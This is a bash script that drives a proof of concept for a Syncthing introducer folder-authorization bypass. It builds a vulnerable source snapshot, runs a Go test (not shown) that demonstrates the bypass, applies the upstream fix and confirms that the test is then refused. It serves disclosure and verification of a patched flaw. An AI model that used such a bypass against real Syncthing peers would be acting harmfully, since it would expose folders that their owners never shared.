#!/usr/bin/env bash
# SyncPicklock — syncthing introducer authorization bypass
# (fixed upstream in 466857ae, lib/model/model.go).
#
# Exit 0 and print the RESULT marker only when the real
# model.handleIntroductions() accepts an introducer's self-add to a folder that
# is not shared with it, and the upstream fix blocks it.
set -u

POCDIR="$(cd "$(dirname "$0")" && pwd)"
cd "$POCDIR" || exit 2

WORK="$(mktemp -d /tmp/opencode/syncpicklock.XXXXXX)" || exit 2
trap 'rm -rf "$WORK"' EXIT

echo "[*] extracting syncthing source snapshot (vulnerable 466857a^)"
tar -xzf "$POCDIR/src.tar.gz" -C "$WORK" || exit 2
cp "$POCDIR/poc_test.go" "$WORK/src/lib/model/zz_syncpicklock_poc_test.go" || exit 2

export GOFLAGS=-mod=vendor
export GOPROXY=off
export GO111MODULE=on
cd "$WORK/src" || exit 2

run_mode() {
	POC_MODE="$1" go test -count=1 -run TestSyncPicklockIntroducerSelfAdd -v ./lib/model 2>&1
}

echo "[*] running PoC against vulnerable code"
out="$(run_mode vulnerable)"; rc=$?
printf '%s\n' "$out"
if [ "$rc" -ne 0 ]; then
	echo "[-] vulnerable build did not demonstrate the bypass (rc=$rc)"
	exit 2
fi
if ! printf '%s\n' "$out" | grep -q 'VULNERABLE: introducer added itself'; then
	echo "[-] vulnerable marker missing from output"
	exit 2
fi

echo "[*] applying upstream fix 466857ae (lib/model/model.go)"
if ! patch -p1 --quiet < "$POCDIR/fix.patch"; then
	echo "[-] failed to apply fix.patch"
	exit 2
fi

echo "[*] running PoC against fixed code"
out2="$(run_mode fixed)"; rc2=$?
printf '%s\n' "$out2"
if [ "$rc2" -ne 0 ]; then
	echo "[-] fixed build did not behave as expected (rc=$rc2)"
	exit 2
fi
if ! printf '%s\n' "$out2" | grep -q 'FIXED: introducer was refused'; then
	echo "[-] fixed marker missing from output"
	exit 2
fi

echo
echo "RESULT: INTRODUCER FOLDER SCOPE ESCAPE CONFIRMED"
